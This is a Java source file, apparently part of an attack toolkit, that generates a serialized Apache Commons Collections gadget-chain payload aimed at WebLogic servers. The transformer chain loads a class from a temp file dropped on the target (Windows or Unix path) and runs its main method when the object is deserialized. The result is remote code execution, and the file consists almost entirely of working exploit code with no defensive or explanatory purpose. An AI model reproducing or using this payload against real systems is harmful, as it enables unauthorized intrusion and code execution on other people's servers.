package com.mtx.xiatian.hacker.weblogic;
 import java.io.ByteArrayOutputStream;
 import java.io.ObjectOutputStream;
 import java.lang.annotation.Retention;
 import java.lang.reflect.Constructor;
 import java.net.URL;
 import java.net.URLClassLoader;
 import java.util.HashMap;
 import java.util.Map;
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import com.mtx.core.tools.MTXLoadJar;
 
 public class GenInstallPayload
 {
   public static byte[] Gen(String OS)
     throws Exception
   {
	   if(true)
			return (byte[])MTXLoadJar.doCallStaticMethod("GenInstallPayload", "Gen", OS);
     String Path = "file:/c:/windows/temp/1vBLBK.tmp";
     if (!OS.equals("Windows"))
     {
       Path = "file:/tmp/1vBLBK.tmp";
     }
 
     Transformer[] transforms = { 
       new ConstantTransformer(URLClassLoader.class), 

new InvokerTransformer("getConstructor",
        new Class[] { Class[].class },
        new Object[] { new Object[] { URL[].class } }),
new InvokerTransformer("newInstance",
        new Class[] { Object[].class },
        
        new Object[] { new Object[] { new Object[] { new URL(Path) } } }),
       new InvokerTransformer("loadClass", 
       new Class[] { String.class }, new Object[] { "weblogic.jndi.internal.InitAppImpl" }), 
       new InvokerTransformer("getMethod", new Class[] { 
       String.class, java.lang.Class[].class }, new Object[] { 
       "main",  new Object[]{java.lang.String[].class}  }), 
       new InvokerTransformer("invoke", new Class[] { 
       Object.class, java.lang.Object[].class }, new Object[] { 
       0, new Object[]{new Object[]{"xx"}} }) };
     Transformer transformerChain = new ChainedTransformer(transforms);
     Map innermap = new HashMap();
     innermap.put("value", "value");
     Map outmap = TransformedMap.decorate(innermap, null, transformerChain);
     Class cls = 
       Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
     Constructor ctor = cls.getDeclaredConstructor(new Class[] { Class.class, Map.class });
     ctor.setAccessible(true);
     Object instance = ctor.newInstance(new Object[] { Retention.class, outmap });
     ByteArrayOutputStream bo = new ByteArrayOutputStream(10);
     ObjectOutputStream out = new ObjectOutputStream(bo);
     out.writeObject(instance);
     out.flush();
     out.close();
     return bo.toByteArray();
   }
 }

